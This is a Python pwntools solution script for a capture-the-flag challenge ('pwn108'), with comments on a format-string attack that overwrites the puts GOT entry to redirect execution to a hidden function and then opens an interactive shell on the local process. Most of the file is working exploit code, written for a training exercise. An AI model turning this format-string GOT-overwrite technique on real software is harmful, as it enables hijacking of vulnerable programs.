#!/usr/bin/python3
from pwn import *

'''
# What will we learn
GOT overwrites

# notable
$ checksec pwn108
    RELRO:    **Partial RELRO**
    Stack:    Canary found
    NX:       NX enabled
    PIE:      **No PIE (0x400000)**

#solve2 misc
sym.holidays @ 0x0040123b
sym.holidays top 2 bytes: 0x0040 = 64 
sym.holidays btm 2 bytes: (0x123b-0x004) = 4603
'''

elf = context.binary = ELF('./pwn108', checksec=False)
got_puts_addr = int('0x00404018', 16)

'''
our input starts at cell %10$ from printf
our input 5 total memory cells
we overwrite the content specified into $n & $hn || cells 14 & 15 (from printf)
payload overwrites got.plt value for puts to point to address of sym.holidays
'''

payload = b"%64X%13$n" + b"%4603X%14$hnXXX" + p64(got_puts_addr+2) + p64(got_puts_addr)

# start process and send blank line for name
p = process()
p.recvuntil(b"name]: ")
p.sendline()

# send payload and spawn interactive session
p.recvuntil(b"No]: ")
p.sendline(payload)
p.interactive()
